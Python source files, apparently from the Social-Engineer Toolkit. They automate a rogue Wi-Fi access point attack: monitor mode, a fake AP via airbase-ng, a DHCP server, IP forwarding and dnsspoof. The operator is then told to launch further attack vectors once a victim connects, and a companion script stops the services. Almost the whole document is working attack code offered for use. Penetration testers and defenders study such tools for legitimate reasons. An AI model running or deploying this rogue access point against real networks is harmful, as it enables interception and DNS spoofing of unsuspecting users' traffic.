    print ("Control-C detected, exiting gracefully...\n")
    exit_set()

########NEW FILE########
__FILENAME__ = stop_wifiattack
#!/usr/bin/env python

import subprocess
from src.core.setcore import *

#
# Simple python script to kill things created by the SET wifi attack vector
#

interface = raw_input(setprompt(["8"], "Enter your wireless interface (ex: wlan0): "))

# fix a bug if present
print_status("Attempting to set rfkill to unblock all if RTL is in use. Ignore errors on this.")
subprocess.Popen("rmmod rtl8187;rfkill block all;rfkill unblock all;modprobe rtl8187;rfkill unblock all;ifconfig %s up" % (interface), shell=True).wait()

print_status("Killing airbase-ng...")
subprocess.Popen("killall airbase-ng", shell=True).wait()

print_status("Killing dhcpd3 and dhclient3...")
subprocess.Popen("killall dhcpd3", shell=True).wait()
subprocess.Popen("killall dhclient3", shell=True).wait()

print_status("Killing dnsspoof...")
subprocess.Popen("killall dnsspoof", shell=True).wait()

print_status("Turning off IP_forwarding...")
subprocess.Popen("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True).wait()

print_status("Killing monitor mode on mon0...")
subprocess.Popen("src/wireless/airmon-ng stop mon0", shell=True).wait()

print_status("Turning off monitor mode on wlan0...")
subprocess.Popen("src/wireless/airmon-ng stop wlan0", shell=True).wait()

print_status("SET has stopped the wireless access point. ")
return_continue()

########NEW FILE########
__FILENAME__ = wifiattack
#!/usr/bin/env python
##############################################
#
# This is a basic setup for an access point
# attack vector in set.
#
##############################################

import sys
import os
import subprocess
import re
import pexpect
import time
from src.core.setcore import *
from src.core.menu import text
from config.set_config import AIRBASE_NG_PATH as airbase_path
from config.set_config import ACCESS_POINT_SSID as access_point
from config.set_config import AP_CHANNEL as ap_channel
from config.set_config import DNSSPOOF_PATH as dnsspoof_path

if not os.path.isfile("/etc/init.d/isc-dhcp-server"):
    print_warning("isc-dhcp-server does not appear to be installed.")
    print_warning("apt-get install isc-dhcp-server to install it. Things may fail now.")

if not os.path.isfile(dnsspoof_path):
    if os.path.isfile("/usr/sbin/dnsspoof"):
        dnsspoof_path = "/usr/sbin/dnsspoof"
    else:
        print_warning("DNSSpoof was not found. Please install or correct path in set_config. Exiting....")
        exit_set()

if not os.path.isfile(airbase_path):
    airbase_path = "src/wireless/airbase-ng"
    print_info("using SET's local airbase-ng binary")

print_info("For this attack to work properly, we must edit the isc-dhcp-server file to include our wireless interface.")
print_info("""This will allow isc-dhcp-server to properly assign IPs. (INTERFACES="at0")""")
print("")
print_status("SET will now launch nano to edit the file.")
print_status("Press ^X to exit nano and don't forget to save the updated file!")
print_warning("If you receive an empty file in nano, please check the path of your isc-dhcp-server file!")
return_continue()
subprocess.Popen("nano /etc/dhcp/dhcpd.conf", shell=True).wait()

# DHCP SERVER CONFIG HERE
dhcp_config1 = ("""
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.100 10.0.0.254;
    option domain-name-servers 8.8.8.8;
    option routers 10.0.0.1;
    option broadcast-address 10.0.0.255;
    default-lease-time 600;
    max-lease-time 7200;
}
""")

dhcp_config2 = ("""
ddns-update-style none;
authoritative;
log-facility local7;
subnet 192.168.10.0 netmask 255.255.255.0 {
    range 192.168.10.100 192.168.10.254;
    option domain-name-servers 8.8.8.8;
    option routers 192.168.10.1;
    option broadcast-address 192.168.10.255;
    default-lease-time 600;
    max-lease-time 7200;
}
""")

show_fakeap_dhcp_menu = create_menu(text.fakeap_dhcp_text, text.fakeap_dhcp_menu)
fakeap_dhcp_menu_choice = raw_input(setprompt(["8"], ""))

if fakeap_dhcp_menu_choice != "":
    fakeap_dhcp_menu_choice = check_length(fakeap_dhcp_menu_choice,2)
    # convert it to a string
    fakeap_dhcp_menu_choice = str(fakeap_dhcp_menu_choice)

if fakeap_dhcp_menu_choice == "":
    fakeap_dhcp_menu_choice = "1"

if fakeap_dhcp_menu_choice == "1":
    # writes the dhcp server out
    print_status("Writing the dhcp configuration file to ~/.set")
    filewrite=file(setdir + "/dhcp.conf", "w")
    filewrite.write(dhcp_config1)
    # close the file
    filewrite.close()
    dhcptun = 1

if fakeap_dhcp_menu_choice == "2":
    # writes the dhcp server out
    print_status("Writing the dhcp configuration file to ~/.set")
    filewrite=file(setdir + "/dhcp.conf", "w")
    filewrite.write(dhcp_config2)
    # close the file
    filewrite.close()
    dhcptun = 2

if fakeap_dhcp_menu_choice == "exit":
    exit_set()

interface = raw_input(setprompt(["8"], "Enter the wireless network interface (ex. wlan0)"))

# place wifi interface into monitor mode
print_status("Placing card in monitor mode via airmon-ng..")

# if we have it already installed then don't use the SET one
if os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "/usr/local/sbin/airmon-ng"

if not os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "src/wireless/airmon-ng"

monproc = subprocess.Popen("%s start %s |  grep \"monitor mode enabled on\" | cut -d\" \" -f5 | sed -e \'s/)$//\'" % (airmonng_path,interface), shell=True, stdout=subprocess.PIPE)
moniface=monproc.stdout.read()
monproc.wait()

# execute modprobe tun
subprocess.Popen("modprobe tun", shell=True).wait()

# create a fake access point
print_status("Spawning airbase-ng in a seperate child thread...")
child = pexpect.spawn('%s -P -C 20 -e "%s" -c %s %s' % (airbase_path,access_point,ap_channel,moniface))
print_info("Sleeping 15 seconds waiting for airbase-ng to complete...")
time.sleep(15)

# bring the interface up
if dhcptun==1:
    print_status("Bringing up the access point interface...")
    subprocess.Popen("ifconfig at0 up", shell=True).wait()
    subprocess.Popen("ifconfig at0 10.0.0.1 netmask 255.255.255.0", shell=True).wait()
    subprocess.Popen("ifconfig at0 mtu 1400", shell=True).wait()
    subprocess.Popen("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1", shell=True).wait()

if dhcptun==2:
    print_status("Bringing up the access point interface...")
    subprocess.Popen("ifconfig at0 up", shell=True).wait()
    subprocess.Popen("ifconfig at0 192.168.10.1 netmask 255.255.255.0", shell=True).wait()
    subprocess.Popen("ifconfig at0 mtu 1400", shell=True).wait()
    subprocess.Popen("route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1", shell=True).wait()

# starts a dhcp server
print_status("Starting the DHCP server on a seperate child thread...")
child2 = pexpect.spawn("service isc-dhcp-server start")

# starts ip_forwarding
print_status("Starting IP Forwarding...")
child3 = pexpect.spawn("echo 1 > /proc/sys/net/ipv4/ip_forward")

# start dnsspoof
print_status("Starting DNSSpoof in a seperate child thread...")
child4 = pexpect.spawn("%s -i at0" % (dnsspoof_path))

print_status("SET has finished creating the attack. If you experienced issues please report them.")
print_status("Now launch SET attack vectors within the menus and have a victim connect via wireless.")
print_status("Be sure to come back to this menu to stop the services once your finished.")
return_continue()

########NEW FILE########
